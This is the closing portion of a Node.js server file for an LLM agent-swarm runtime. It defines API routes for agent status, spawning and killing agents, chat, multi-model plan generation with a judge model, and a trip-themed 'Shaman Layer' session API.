      return sendJson(res, 200, { system: { uptime: process.uptime(), memory: process.memoryUsage(), cpu: os.loadavg(), platform: os.platform() }, swarm: { totalAgents, totalActive, totalDivisions: 9, divisions: divisionStats }, logs: { total: state.logs.length, byType: state.logs.reduce((acc, log) => { acc[log.type] = (acc[log.type] || 0) + 1; return acc; }, {}) }, responses: { total: state.responses.length }, timestamp: new Date().toISOString() });
    }

    if (pathname === '/api/pipeline' && method === 'GET') {
      const registry = [{ name: 'axolotl', emoji: '🧠', role: 'Regenerator', skills: ['heal', 'recover'], division: 'Infrastructure' }, { name: 'bee', emoji: '🐝', role: 'Worker', skills: ['execute', 'build'], division: 'Engineering' }, { name: 'cactus', emoji: '🌵', role: 'Survivor', skills: ['endure', 'thrive'], division: 'Design' }, { name: 'chonk', emoji: '🐕', role: 'Comfy', skills: ['comfort', 'support'], division: 'Operations' }, { name: 'claw', emoji: '🦀', role: 'Builder', skills: ['code', 'create'], division: 'Management' }, { name: 'crow', emoji: '🐦', role: 'Intelligence', skills: ['learn', 'pattern'], division: 'Management' }, { name: 'dragon', emoji: '🐉', role: 'Warrior', skills: ['combat', 'defend'], division: 'Engineering' }, { name: 'duck', emoji: '🦆', role: 'Utility', skills: ['debug', 'assist'], division: 'Design' }, { name: 'elephant', emoji: '🐘', role: 'Memory', skills: ['remember', 'store'], division: 'Infrastructure' }, { name: 'fox', emoji: '🦊', role: 'Trickster', skills: ['humor', 'chaos'], division: 'Operations' }, { name: 'ghost', emoji: '👻', role: 'Infiltrator', skills: ['stealth', 'hide'], division: 'Security' }, { name: 'goose', emoji: '🪿', role: 'Defender', skills: ['guard', 'alert'], division: 'Media Ops' }, { name: 'gorilla', emoji: '🦍', role: 'Heavy', skills: ['lift', 'power'], division: 'Infrastructure' }, { name: 'guardian', emoji: '🛡️', role: 'Security', skills: ['protect', 'scan'], division: 'Security' }, { name: 'hawk', emoji: '🦅', role: 'Scout', skills: ['spot', 'vision'], division: 'Operations' }, { name: 'jellyfish', emoji: '🪼', role: 'Drifter', skills: ['float', 'drift'], division: 'Infrastructure' }, { name: 'karen', emoji: '👩', role: 'Manager', skills: ['handle', 'escalate'], division: 'Media Ops' }, { name: 'kraken', emoji: '🦑', role: 'Deep Thinker', skills: ['analyze', 'deep'], division: 'Data Mining' }, { name: 'lemur', emoji: '🦝', role: 'Nimble', skills: ['climb', 'adapt'], division: 'Infrastructure' }, { name: 'mantis', emoji: '🐜', role: 'Predator', skills: ['debug', 'optimize'], division: 'Management' }, { name: 'moth', emoji: '🦋', role: 'Nighter', skills: ['night', 'light'], division: 'Lobby' }, { name: 'mushroom', emoji: '🍄', role: 'Trippy', skills: ['hallucinate', 'weird'], division: 'Design' }, { name: 'numbers', emoji: '🔢', role: 'Calculator', skills: ['count', 'math'], division: 'Data Mining' }, { name: 'octopus', emoji: '🐙', role: 'Multitasker', skills: ['parallel', '8arms'], division: 'Engineering' }, { name: 'owl', emoji: '🦉', role: 'Wise', skills: ['analyze', 'know'], division: 'Engineering' }, { name: 'panda', emoji: '🐼', role: 'Peaceful', skills: ['calm', 'bamboo'], division: 'Lobby' }, { name: 'parrot', emoji: '🦜', role: 'Repeater', skills: ['repeat', 'mimic'], division: 'Media Ops' }, { name: 'penguin', emoji: '🐧', role: 'Cool', skills: ['cold', 'calculate'], division: 'Design' }, { name: 'phoenix', emoji: '🔥', role: 'Rebirth', skills: ['restart', 'recover'], division: 'Management' }, { name: 'rabbit', emoji: '🐰', role: 'Speed', skills: ['fast', 'race'], division: 'Engineering' }, { name: 'robot', emoji: '🤖', role: 'Machine', skills: ['precise', 'repeat'], division: 'Engineering' }, { name: 'shark', emoji: '🦈', role: 'Hunter', skills: ['hunt', 'track'], division: 'Lobby' }, { name: 'scientist', emoji: '🔬', role: 'Researcher', skills: ['research', 'test'], division: 'Data Mining' }, { name: 'snake', emoji: '🐍', role: 'Coder', skills: ['python', 'coiled'], division: 'Security' }, { name: 'spider', emoji: '🕷️', role: 'Web', skills: ['scrape', 'crawl'], division: 'Security' }, { name: 'turtle', emoji: '🐢', role: 'Steady', skills: ['slow', 'stable'], division: 'Operations' }, { name: 'void', emoji: '🕳️', role: 'Eraser', skills: ['delete', 'null'], division: 'Engineering' }, { name: 'wolf', emoji: '🐺', role: 'Pack Leader', skills: ['command', 'alpha'], division: 'Design' }];
      const swarm = Object.entries(state.swarmAgents).map(([id, a]) => {
        const procInfo = state.activeProcesses[a.pid];
        let cpu = 0, memory = 0;
        if (procInfo && procInfo.process) {
          try { cpu = procInfo.process.cpuUsage ? procInfo.process.cpuUsage().user / 1000000 : 0; memory = procInfo.process.memoryUsage ? procInfo.process.memoryUsage().heapUsed : 0; } catch (e) {}
        }
        return { id: a.id, name: a.name || null, division: a.division, status: a.status, currentTask: a.currentTask, pid: a.pid, startTime: a.startTime, cpu: Math.round(cpu * 100) / 100, memory: Math.round(memory / 1024 / 1024 * 100) / 100 };
      });
      const allDivisions = ['AI Research', 'Media Ops', 'Security', 'Data Mining', 'Engineering', 'Design', 'Management', 'Infrastructure', 'Lobby'];
      const divisions = allDivisions.map(divName => {
        const divAgents = swarm.filter(a => a.division === divName);
        const working = divAgents.filter(a => a.status === 'working');
        const totalCpu = divAgents.reduce((s, a) => s + a.cpu, 0);
        const totalMem = divAgents.reduce((s, a) => s + a.memory, 0);
        return { name: divName, agentCount: divAgents.length, activeAgents: working.length, cpuUsage: Math.round(totalCpu * 100) / 100, memoryUsage: Math.round(totalMem * 100) / 100, agents: divAgents.map(a => ({ id: a.id, name: a.name, status: a.status, currentTask: a.currentTask })) };
      });
      const totalSpawned = Object.keys(state.swarmAgents).length;
      const stats = { totalAgents: swarm.length, activeNow: swarm.filter(a => a.status === 'working').length, totalCpu: Math.round(swarm.reduce((s, a) => s + a.cpu, 0) * 100) / 100, totalMemory: Math.round(swarm.reduce((s, a) => s + a.memory, 0) * 100) / 100, systemUptime: process.uptime(), systemMemory: process.memoryUsage().heapUsed, systemCpu: os.loadavg() };
      return sendJson(res, 200, { registry: { agents: registry, count: registry.length }, swarm: { agents: swarm, count: swarm.length }, divisions: { list: divisions, count: divisions.length }, stats, sammyStatus: state.sammyStatus, sammyCurrentTask: state.sammyCurrentTask, bridgeConnected: bridgeWs && !bridgeWs.destroyed, timestamp: new Date().toISOString() });
    }

    if (pathname === '/api/tower/status' && method === 'GET') {
      const status = AgentTower.getAgentStatus();
      return sendJson(res, 200, status);
    }

    if (pathname === '/api/tower/divisions' && method === 'GET') {
      const divisionsWithCounts = {};
      for (const [key, info] of Object.entries(AgentTower.divisions || {})) {
        divisionsWithCounts[key] = { ...info, agentCount: info.agents?.length || 0 };
      }
      return sendJson(res, 200, divisionsWithCounts);
    }

    if (pathname === '/api/tower/agents' && method === 'GET') {
      const status = AgentTower.getAgentStatus();
      return sendJson(res, 200, status.registeredAgents);
    }

    // ── /api/composer/context — Active Context Panel data ────────────────
    // Powers the "what will be sent" panel above the textbox. Returns
    // per-item preview, real token count, the prompt that will be built,
    // and any warnings (size, secrets). Real file reads, no fakery.
    if (pathname === '/api/composer/context' && method === 'POST') {
      return composerContextHandler(req, res);
    }

    // ── /api/cognitive/events — live event feed (SSE) ─────────────────
    // Streams state.logs as they arrive. Backed by the existing
    // state.logs buffer (max 1000 entries, ring-buffer). The cognitive
    // panel subscribes and shows what's happening right now.
    if (pathname === '/api/cognitive/events' && method === 'GET') {
      sseStart(res);
      // First, send the recent backlog (last 50 entries) so the client
      // has something to render immediately.
      const backlog = state.logs.slice(0, 50).reverse();
      for (const ev of backlog) {
        sseEvent(res, 'event', { kind: 'history', log: ev });
      }
      sseEvent(res, 'phase', { phase: 'live', total: state.logs.length });
      // Subscribe to new logs
      const onLog = (log) => sseEvent(res, 'event', { kind: 'live', log });
      const interval = setInterval(() => sseComment(res, 'keepalive'), 15000);
      logSubscribers.add(onLog);
      req.on('close', () => {
        clearInterval(interval);
        logSubscribers.delete(onLog);
        try { res.end(); } catch {}
      });
      return;
    }

    if (pathname === '/api/tower/teams' && method === 'GET') {
      const status = AgentTower.getAgentStatus();
      return sendJson(res, 200, status.teams);
    }

    if (pathname === '/api/chat/swarm' && method === 'POST') {
      // Swarm mode — fan out to N agents in parallel, stream each one's tokens
      if ((req.headers['accept'] || '').includes('text/event-stream')) {
        return handleChatSwarm(req, res);
      }
      // Non-streaming JSON: just call and wait
      try {
        const body = await parseBody(req);
        const { message, agents } = body;
        if (!message) return sendJson(res, 400, { ok: false, error: 'message required' });
        const llm = require('./lib/llm-provider');
        const defaultAgents = [
          { id: "planner", role: "Planner", system: "You are Quill Planner. Produce a concise 3-7 step plan for the user's goal. Be specific, not generic. Max 200 words." },
          { id: "researcher", role: "Researcher", system: "You are Quill Researcher. Surface 3-5 key facts, prior art, and best practices for the user's goal. Be concrete, not theoretical. Max 200 words." },
          { id: "builder", role: "Builder", system: "You are Quill Builder. Identify which files/functions to touch and what the diff would look like. Be specific with file paths. Max 200 words." },
        ];
        const agentList = Array.isArray(agents) && agents.length ? agents : defaultAgents;
        const results = await Promise.allSettled(agentList.map(async (a) => {
          const r = await llm.chat([
            { role: 'system', content: a.system },
            { role: 'user', content: message },
          ], { temperature: 0.4, maxTokens: 600 });
          return { id: a.id, role: a.role, ok: true, content: r.content, model: r.model };
        }));
        const succeeded = results.filter(r => r.status === 'fulfilled' && r.value.ok).map(r => r.value);
        return sendJson(res, 200, { ok: succeeded.length > 0, agents: succeeded, total: agentList.length });
      } catch (e) { return sendJson(res, 500, { ok: false, error: e.message }); }
    }

    if (pathname === '/api/chat' && method === 'POST') {
      // SSE streaming mode — when client requests text/event-stream, stream
      // tokens as they arrive. Otherwise fall through to the JSON path.
      if ((req.headers['accept'] || '').includes('text/event-stream')) {
        return handleChatStream(req, res);
      }
      try {
        const body = await parseBody(req);
        const { message, spawnAgents = true } = body;
        if (!message) return sendJson(res, 400, { error: 'message required' });

        // Use the real agent-loop (same tool-calling brain as CLI ask and SSE chat).
        // This kills the keyword if-ladder that was routing to one-shot tower calls.
        const { runAgent } = require('./lib/agent-loop');
        let fullReply = '';
        let modelName = '';
        let toolCalls = [];
        let steeringCapsuleId = null;
        const errors = [];

        for await (const ev of runAgent({
          prompt: message,
          opts: { maxTokens: 2048, temperature: 0.7 },
        })) {
          if (ev.type === 'token') {
            fullReply += ev.content;
            modelName = ev.model || modelName;
          } else if (ev.type === 'steering') {
            steeringCapsuleId = ev.capsuleId || null;
          } else if (ev.type === 'steering-blocked') {
            errors.push(`steering: completion blocked (${ev.conflicts.length} unresolved conflict${ev.conflicts.length === 1 ? '' : 's'}) pending operator escalation`);
          } else if (ev.type === 'tool-call') {
            toolCalls.push({ tool: ev.tool, args: ev.args, capsuleId: ev.capsuleId });
          } else if (ev.type === 'tool-result') {
            // collected implicitly
          } else if (ev.type === 'error') {
            errors.push(ev.error);
          } else if (ev.type === 'done') {
            break;
          }
        }

        return sendJson(res, 200, {
          ok: true,
          reply: fullReply,
          model: modelName,
          capsuleId: steeringCapsuleId || undefined,
          tool_calls: toolCalls,
          errors: errors.length > 0 ? errors : undefined,
          turns: toolCalls.length > 0 ? 'multi-turn' : 'single',
        });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/tower/spawn' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { agentName, task, teamId, parentId } = body;
        if (!agentName) return sendJson(res, 400, { error: 'agentName required' });
        const result = await AgentTower.spawnAgent(agentName, task || 'No task specified', { teamId, parentId });
        if (result.success) {
          broadcast({ type: 'tower_agent_spawned', agentId: result.agent.id, name: agentName, task, timestamp: new Date().toISOString() });
          return sendJson(res, 200, { ok: true, agentId: result.agent.id, agent: result.agent });
        }
        return sendJson(res, 500, { error: result.error });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/tower/team' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { name, leader, members, task, priority } = body;
        if (!leader) return sendJson(res, 400, { error: 'leader required' });
        const result = await AgentTower.spawnTeam({ name, leader, members, task: task || 'Team task', priority });
        if (result.success) {
          broadcast({ type: 'tower_team_spawned', teamId: result.team.id, name: result.team.name, leader, members, timestamp: new Date().toISOString() });
          return sendJson(res, 200, { ok: true, teamId: result.team.id, team: result.team });
        }
        return sendJson(res, 500, { error: result.error });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname.startsWith('/api/tower/agents/') && method === 'DELETE') {
      const agentId = pathname.split('/')[4];
      const result = AgentTower.killAgent(agentId);
      if (result.success) {
        broadcast({ type: 'tower_agent_killed', agentId, timestamp: new Date().toISOString() });
        return sendJson(res, 200, { ok: true, result });
      }
      return sendJson(res, 404, { error: result.error || 'Agent not found' });
    }

    if (pathname.startsWith('/api/tower/team/') && method === 'DELETE') {
      const teamName = pathname.split('/')[4];
      const status = AgentTower.getAgentStatus();
      const team = status.teams.find(t => t.name === teamName || t.id === teamName);
      if (!team) return sendJson(res, 404, { error: 'Team not found' });
      const result = AgentTower.killTeam(team.id);
      broadcast({ type: 'tower_team_disbanded', teamId: team.id, name: teamName, timestamp: new Date().toISOString() });
      return sendJson(res, 200, { ok: true, result });
    }

    if (pathname === '/api/tower/connect' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const url = body.url || XIAOZHI_WS_URL;
        if (!url) return sendJson(res, 400, { error: 'No XIAOZHI_WS_URL configured and no url provided' });
        const result = AgentTower.connectToBall(url);
        return sendJson(res, 200, { ok: result.success, status: result.status, url });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== KIMI API ENDPOINTS ==========
    if (pathname === '/api/kimi/status' && method === 'GET') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized', hint: 'Set KIMI_API_KEY environment variable' });
      return sendJson(res, 200, {
        kimiEnabled: true,
        usage: kimiClient.getUsage(),
        costEstimate: kimiClient.getCostEstimate()
      });
    }

    if (pathname === '/api/kimi/parse' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        const { text } = body;
        if (!text) return sendJson(res, 400, { error: 'text required' });
        const parsed = kimiClient.parseCommand(text);
        return sendJson(res, 200, parsed);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/kimi/plan' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        const { text, swarmState } = body;
        if (!text) return sendJson(res, 400, { error: 'text required' });
        const intent = kimiClient.parseCommand(text);
        const plan = kimiClient.createPlan(intent, swarmState || {});
        return sendJson(res, 200, plan);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/kimi/spawn' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        const { tier, name, role, mission, objective, tools } = body;
        const subagent = await kimiClient.spawnSubagent({
          tier: tier || 'Standard',
          name: name || 'KimmiSubagent',
          role: role || 'TaskExecutor',
          mission: mission || 'Execute assigned task',
          objective: objective || text || 'Complete task',
          tools: tools || []
        });
        return sendJson(res, 200, subagent);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/kimi/team' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        const { tier, mission, objectives, tools, agentCount } = body;
        const team = await kimiClient.spawnTeam({
          tier: tier || 'Standard',
          mission: mission || 'Team objective',
          objectives: objectives || ['Execute task 1', 'Execute task 2', 'Execute task 3'],
          tools: tools || [],
          agentCount: agentCount || 3
        });
        return sendJson(res, 200, team);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/kimi/memory' && method === 'GET') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      return sendJson(res, 200, kimiClient.getSwarmMemory());
    }

    if (pathname === '/api/kimi/memory' && method === 'POST') {
      if (!kimiClient) return sendJson(res, 503, { error: 'KimiClient not initialized' });
      try {
        const body = await parseBody(req);
        kimiClient.updateSwarmMemory(body);
        return sendJson(res, 200, { ok: true });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== SHAMAN LAYER ENDPOINTS ==========
    
    // POST /api/llm/plan — plan-then-act mode (Claude Code pattern)
    // Decompose a user goal into a structured plan of steps. The LLM
    // returns a JSON array; we parse it and return a normalized plan
    // for the UI to render with approve/execute buttons.
    //
    // Mode = "single" (default) — one model proposes the plan.
    // Mode = "fanout"   — 3 models propose in parallel, quill merges.
    //
    // context = true   — inject top-5 semantically-relevant code chunks
    //                    into the planner prompt (real codebase grounding).
    if (pathname === '/api/llm/plan' && method === 'POST') {
      // Stream mode: SSE so the UI can show steps as they're generated
      if ((req.headers['accept'] || '').includes('text/event-stream')) {
        return handlePlanStream(req, res);
      }
      // Stream mode: SSE so the UI can show steps as they're generated
      if ((req.headers['accept'] || '').includes('text/event-stream')) {
        return handlePlanStream(req, res);
      }
      try {
        const body = await parseBody(req);
        const { goal, source = 'plan', mode = 'single', models: fanoutModels, context: useContext = true } = body;
        if (!goal) return sendJson(res, 400, { ok: false, error: 'goal required' });

        console.log(`[PLAN ${mode}${useContext ? '+ctx' : ''}] ${goal.substring(0, 120)}`);

        const llm = require('./lib/llm-provider');

        // ── Codebase context: pull top-N relevant chunks ─────────────────────
        // The semantic search index (vectors.bin) gives us real "where is X"
        // answers in ~1s. The plan model sees the actual file paths and
        // snippets, so it can plan against real symbols.
        let codebaseContext = '';
        let contextSources = [];
        if (useContext) {
          try {
            const { searchSemantic } = require('./lib/commands/code');
            const r = await searchSemantic(goal, 5);
            if (r && r.results && r.results.length) {
              contextSources = r.results.map(x => ({ file: x.file, score: x.score }));
              const ctxLines = r.results.map((x, i) => {
                const lines = (x.content || '').split('\n').slice(0, 12).join('\n');
                return `[${i + 1}] ${x.file} (score ${x.score.toFixed(3)})\n${lines}`;
              });
              codebaseContext = `\n\nCodebase context (top ${r.results.length} relevant files from semantic search over the live codebase):\n${ctxLines.join('\n\n')}`;
            }
          } catch (e) {
            console.warn('[PLAN] codebase context failed:', e.message);
          }
        }

        const PLAN_SYSTEM = `You are Quill, the planning assistant for the PURPCLAW runtime.
Decompose the user's goal into 3-7 concrete, ordered steps. For each step return a JSON object with:
  - "title": short imperative ("Pull recent training data", "Generate the chart")
  - "command": the actual prompt / kernel goal / tool call to execute
  - "route": one of [chat, kernel, groupchat, research, swarm, mission, code, services, training, autoresearch]
  - "expected": what success looks like (1 sentence)
  - "rationale": 1 sentence explaining why this step is needed

If codebase context is provided, USE IT: reference real file paths, real function names, real existing patterns. Steps should be grounded in the actual codebase, not generic advice.

Respond ONLY with a JSON array of those step objects, no prose, no markdown fences.
Example:
[{"title":"Pull last 24h of training trajectories","command":"purpclaw training export chatml --since=24h","route":"training","expected":"~50-200 ndjson lines on disk","rationale":"Need real trajectories to feed the export step"}]`;

        const userPrompt = goal + codebaseContext;

        // Single-model: cheapest, fastest. Default for quick planning.
        if (mode === 'single') {
          let planText = '';
          try {
            // If the caller passed a model, honor it. Otherwise the
            // default chain (OpenRouter → minimax → local qwen) decides.
            const chatOpts = { maxTokens: 2500, temperature: 0.2 };
            if (Array.isArray(fanoutModels) && fanoutModels[0]) chatOpts.model = fanoutModels[0];
            const resp = await llm.chat([
              { role: 'system', content: PLAN_SYSTEM },
              { role: 'user', content: userPrompt },
            ], chatOpts);
            planText = resp?.content || '';
          } catch (e) {
            return sendJson(res, 502, { ok: false, error: 'llm unreachable: ' + e.message });
          }
          const parsed = parsePlanJson(planText);
          return sendJson(res, 200, {
            ok: true, goal, source, mode,
            raw: planText.slice(0, 4000),
            steps: parsed.steps,
            stepCount: parsed.steps.length,
            parseError: parsed.parseError,
            provider: parsed.provider,
            model: parsed.model,
            contextSources,
            contextInjected: codebaseContext ? true : false,
          });
        }

        // Fanout: 3 independent plans, merged by a "judge" model. The
        // judge sees all three proposals + the goal and picks the best
        // steps in optimal order. This is the multi-model quality lift
        // that gets Quill planning close to Claude Code's plan quality.
        if (mode === 'fanout') {
          const candidates = Array.isArray(fanoutModels) && fanoutModels.length
            ? fanoutModels.slice(0, 5)
            : ['openai/gpt-oss-20b:free', 'z-ai/glm-4.5-air:free', 'google/gemma-4-26b-a4b-it:free'];

          // Phase 1: each model proposes a plan in parallel
          const proposals = await Promise.allSettled(candidates.map(async (model) => {
            const t0 = Date.now();
            try {
              const resp = await llm.chat([
                { role: 'system', content: PLAN_SYSTEM },
                { role: 'user', content: userPrompt },
              ], { maxTokens: 1500, temperature: 0.4, model });
              return { model, ok: true, text: resp?.content || '', elapsed: Date.now() - t0 };
            } catch (e) {
              return { model, ok: false, error: e.message, elapsed: Date.now() - t0 };
            }
          }));

          const succeeded = proposals
            .filter(p => p.status === 'fulfilled' && p.value.ok)
            .map(p => p.value);
          if (succeeded.length === 0) {
            return sendJson(res, 502, {
              ok: false, error: 'all fan-out models failed',
              proposals: proposals.map(p => p.status === 'fulfilled' ? p.value : { error: String(p.reason) }),
              contextSources,
            });
          }

          // Phase 2: judge merges into one plan. Use the first candidate
          // (cheapest, fastest) as the judge.
          const judgeModel = succeeded[0].model;
          const judgePrompt = `You are a senior planner. Three independent AI models have proposed plans for this goal. Your job is to pick the BEST steps from across all three and merge them into a single optimal 3-7 step plan.

Goal: ${goal}

Proposals:
${succeeded.map((p, i) => `--- MODEL ${i + 1} (${p.model}) ---\n${p.text}`).join('\n\n')}

Merge the best steps into a single JSON array. Pick steps that are concrete and dispatchable. Drop duplicates. Reorder for proper dependencies. Each step: {title, command, route, expected, rationale}.

Respond ONLY with a JSON array, no prose.`;

          let mergedText = '';
          try {
            const resp = await llm.chat([
              { role: 'system', content: 'You merge multiple AI plans into the single best plan. Output pure JSON only.' },
              { role: 'user', content: judgePrompt },
            ], { maxTokens: 1800, temperature: 0.1, model: judgeModel });
            mergedText = resp?.content || '';
          } catch (e) {
            // Judge failed — fall back to the first successful proposal
            const fallback = parsePlanJson(succeeded[0].text);
            return sendJson(res, 200, {
              ok: true, goal, source, mode: 'fanout-fallback',
              steps: fallback.steps,
              stepCount: fallback.steps.length,
              parseError: fallback.parseError,
              proposals: succeeded.map(s => ({ model: s.model, elapsed: s.elapsed })),
              judgeError: e.message,
              contextSources,
              contextInjected: codebaseContext ? true : false,
            });
          }
          const parsed = parsePlanJson(mergedText);
          return sendJson(res, 200, {
            ok: true, goal, source, mode: 'fanout',
            raw: mergedText.slice(0, 4000),
            steps: parsed.steps,
            stepCount: parsed.steps.length,
            parseError: parsed.parseError,
            proposals: succeeded.map(s => ({ model: s.model, elapsed: s.elapsed })),
            judge: judgeModel,
            contextSources,
            contextInjected: codebaseContext ? true : false,
          });
        }

        return sendJson(res, 400, { ok: false, error: 'mode must be "single" or "fanout"' });
      } catch (e) { return sendJson(res, 500, { ok: false, error: e.message }); }
    }


    // GET /api/shaman/status - Get Shaman state
    if (pathname === '/api/shaman/status' && method === 'GET') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, shaman.getState());
    }

    // POST /api/shaman/start - Start a trip session
    if (pathname === '/api/shaman/start' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { problem, autoPilot, maxCycles, backend } = body;
        
        if (backend) shaman.config.backend = { ...shaman.config.backend, ...backend };
        if (typeof autoPilot === 'boolean') shaman.config.autoPilot = autoPilot;
        if (typeof maxCycles === 'number') shaman.config.maxCycles = maxCycles;
        
        const result = shaman.start(problem);
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // POST /api/shaman/cycle - Run one trip cycle
    if (pathname === '/api/shaman/cycle' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { userInput } = body;
        
        const result = await shaman.runCycle(userInput);
        
        if (shamanEvaluator) {
          const analysis = shamanEvaluator.analyze(result.message?.content || '');
          const suggestion = shamanEvaluator.suggestPhase(shaman.state.phase, analysis, shaman.state.cycle);
          result.evaluation = { analysis, suggestion };
        }
        
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // POST /api/shaman/nudge - Send a steering nudge
    if (pathname === '/api/shaman/nudge' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { text, type } = body;
        if (!text) return sendJson(res, 400, { error: 'text required' });
        
        const nudge = shaman.addNudge(text, type || 'shaman');
        return sendJson(res, 200, nudge);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // POST /api/shaman/phase - Change phase manually
    if (pathname === '/api/shaman/phase' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { phase } = body;
        if (!phase) return sendJson(res, 400, { error: 'phase required (come_up, peak, comedown, integration, done)' });
        
        const params = shaman.setPhase(phase);
        return sendJson(res, 200, { phase, params });
      } catch (e) { return sendJson(res, 400, { error: e.message }); }
    }

    // POST /api/shaman/integrate - Run integration ceremony
    if (pathname === '/api/shaman/integrate' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const result = await shaman.runIntegration(body.prompt);
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // POST /api/shaman/pause
    if (pathname === '/api/shaman/pause' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, shaman.pause());
    }

    // POST /api/shaman/resume
    if (pathname === '/api/shaman/resume' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, shaman.resume());
    }

    // POST /api/shaman/end
    if (pathname === '/api/shaman/end' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, shaman.end());
    }

    // GET /api/shaman/logs - List saved trip logs
    if (pathname === '/api/shaman/logs' && method === 'GET') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      return sendJson(res, 200, { logs: shaman.listTripLogs() });
    }

    // GET /api/shaman/logs/:sessionId - Get specific trip log
    if (pathname.match(/^\/api\/shaman\/logs\/.+$/) && method === 'GET') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      const sessionId = pathname.split('/')[4];
      const log = shaman.loadTripLog(sessionId);
      if (!log) return sendJson(res, 404, { error: 'Trip log not found' });
      return sendJson(res, 200, log);
    }

    // POST /api/shaman/parallel - Start parallel trip agents
    if (pathname === '/api/shaman/parallel' && method === 'POST') {
      if (!shaman) return sendJson(res, 503, { error: 'Shaman Layer not initialized' });
      try {
        const body = await parseBody(req);
        const { problem, count, archetypes, tools } = body;
        const numAgents = Math.min(count || 3, 10);
        
        const agents = [];
        const perspectives = [
          'dive deep into the technical architecture',
          'explore the emotional user experience',
          'examine the business value proposition',
          'probe the hidden assumptions',
          'connect to unrelated domains'
        ];
        
        for (let i = 0; i < numAgents; i++) {
          const agentShaman = new (require('./digital_shaman.js').DigitalShaman)({
            backend: shaman.config.backend,
            mcpTools: tools || [],
            autoPilot: false,
            maxCycles: 8
          });
          
          agentShaman.start(problem);
          agentShaman.setPhase(i === 0 ? 'peak' : 'come_up');
          
          if (archetypes && archetypes[i]) {
            const { getArchetypeMask } = require('./shaman_prompts.js');
            agentShaman.addNudge(getArchetypeMask(archetypes[i]), 'archetype');
          }
          
          agents.push({
            id: agentShaman.state.sessionId,
            index: i,
            perspective: perspectives[i % perspectives.length],
            phase: agentShaman.state.phase
          });
        }
        
        return sendJson(res, 200, { 
          sessionId: `parallel_${Date.now()}`,
          problem,
          agentCount: agents.length,
          agents
        });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== END SHAMAN LAYER ENDPOINTS ==========

    sendJson(res, 404, { error: 'Not found', path: pathname });
  } catch (err) { sendJson(res, 500, { error: err.message }); }
});

server.listen(PORT, () => {
  console.log(`[UNIFIED API] Listening on http://localhost:${PORT}`);
  console.log(`[UNIFIED API] SSE stream: http://localhost:${PORT}/api/stream`);
  console.log(`[UNIFIED API] WebSocket: ${XIAOZHI_WS_URL ? 'configured' : 'NOT SET (set XIAOZHI_WS_URL)'}`);
  console.log(`[UNIFIED API] Tools: ${TOOLS.length}`);
  connectToBridge();
  if (XIAOZHI_WS_URL) connectWS();
  startLocalTcpServer();
  AgentTower.connectToUnifiedApi(PORT);
  setTimeout(() => { spawnDivisionAgent('Engineering', 'Initialize system'); spawnDivisionAgent('Security', 'Monitor system'); spawnDivisionAgent('AI Research', 'Analyze patterns'); console.log('[UNIFIED API] Swarm initialized'); }, 1000);
});

server.on('error', (err) => { console.error('[UNIFIED API] Server error:', err.message); });

process.on('SIGINT', () => { if (hb) clearInterval(hb); if (rc) clearTimeout(rc); ws?.close(); if (purpProc) purpProc.kill(); if (pwBrowser) pwBrowser.close().catch(() => {}); process.exit(0); });
process.on('uncaughtException', e => { console.error('[UNIFIED API] CRASH:', e.message); if (ws) recon(); });
process.on('unhandledRejection', (reason, promise) => {
  console.error('[UNIFIED API] UNHANDLED REJECTION:', reason);
});
